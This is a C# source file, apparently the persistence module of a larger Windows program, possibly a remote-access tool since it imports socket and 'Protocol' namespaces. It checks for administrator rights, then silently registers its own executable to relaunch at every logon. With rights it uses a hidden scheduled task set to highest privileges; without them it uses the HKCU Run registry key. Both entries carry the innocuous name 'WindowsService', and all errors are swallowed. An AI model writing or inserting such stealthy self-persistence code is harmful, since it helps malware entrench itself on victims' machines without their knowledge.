using System;
using System.Security.Principal;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Diagnostics;
using System.Reflection;
using Protocol;
using System.IO;

namespace WindowsService
{
    public class AdminBoolean
    {
        private static AdminBoolean _instance;
        public static AdminBoolean  Instance
        {
            get
            {
                if(_instance == null)
                {
                    _instance = new AdminBoolean();
                }
                return _instance;
            }
        }

        public bool isEnabled { get; set; } 
    }

    class AdminCfg
    {
        private bool _isAdmin { get; set; }

        

        public void Start()
        {
            CheckAdmin();
            Startup();
        }

        public void CheckAdmin()
        {
            try
            {
                using (WindowsIdentity id = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(id);
                    _isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                    AdminBoolean.Instance.isEnabled = _isAdmin;
                }
            }
            catch 
            {
                _isAdmin = false;
                AdminBoolean.Instance.isEnabled = false;
            }
        }

        public void Startup(string args = null)
        {

            
            if (_isAdmin)
            {
                try
                {
                    var exePath = Assembly.GetExecutingAssembly().Location;
                    var taskName = "WindowsService";
                    string tr = $"\"{exePath}\"" + (string.IsNullOrWhiteSpace(args) ? "" : $" {args}");
                    var psi = new ProcessStartInfo("schtasks",
                        $"/Create /TN \"{taskName}\" /TR \"{tr}\" /SC ONLOGON /RL HIGHEST /F")
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    Process.Start(psi)?.WaitForExit();
                } catch
                {

                }
            } else
            {
                try
                {
                    var exePath = Assembly.GetExecutingAssembly().Location;
                    var taskName = "WindowsService";
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                    {
                        key.SetValue(taskName, $"\"{exePath}\"");
                    }
                }
                catch
                {

                }
                
            }
        }
    }
}
